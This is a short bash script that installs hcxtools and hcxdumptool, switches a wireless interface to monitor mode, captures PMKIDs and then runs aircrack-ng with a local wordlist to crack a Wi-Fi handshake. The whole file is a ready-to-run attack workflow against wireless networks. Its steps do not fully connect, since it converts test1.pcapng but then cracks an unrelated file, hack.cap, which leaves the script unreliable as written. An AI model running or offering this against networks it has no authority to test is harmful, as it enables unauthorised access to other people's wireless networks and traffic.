#!/bin/bash

# Install required packages
sudo apt install -y firmware-realtek wireless-tools libssl-dev pkg-config libcurl4-openssl-dev

# Clone hcxtools repository
git clone https://github.com/ZerBea/hcxtools 
cd hcxtools/
make
sudo make install
cd ../

# Clone hcxdumptool repository
git clone https://github.com/ZerBea/hcxdumptool.git
cd hcxdumptool/
make
sudo make install
cd ../

# Start monitor mode on wireless interface
sudo airmon-ng start wlo1
sleep 15s

# Run hcxdumptool to capture PMKIDs
sudo hcxdumptool -i wlo1 -o test1.pcapng --enable_status=1
sleep 2m

# Convert captured data to text format
sudo hcxpcapngtool -o test1.txt test1.pcapng 
sleep 30s

# Run aircrack-ng to crack the captured handshake
sudo aircrack-ng hack.cap -w /home/swaksh/VSCode/thermo/sequence.txt
